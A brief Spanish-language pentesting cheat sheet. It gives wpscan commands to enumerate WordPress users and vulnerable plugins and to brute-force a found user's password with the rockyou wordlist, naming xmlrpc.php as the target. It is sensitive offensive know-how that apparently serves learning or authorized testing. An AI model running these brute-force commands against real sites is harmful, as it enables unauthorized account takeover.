Sirve para encontrar usuarios y hacer fuerza bruta en wordpress


## encontrar usuarios en wodpress

```sh fold:"wpscan encontrar usuarios"
wpscan --url {url sin el fichero wp.login.php} --enumerate u,vp
#u usuarios
#vp plugings
```


## ataques de fuerza fruta con wpscan

```sh fold:"wpscan encontrar usuarios"
wpscan --url {url sin el fichero wp.login.php} --password /usr/share/wordlists/rockyou.txt --usernames {usuarioEncontradoAnteriormente}
#u usuarios
#vp plugings
```


fichero al que se ataca XMLRPC.php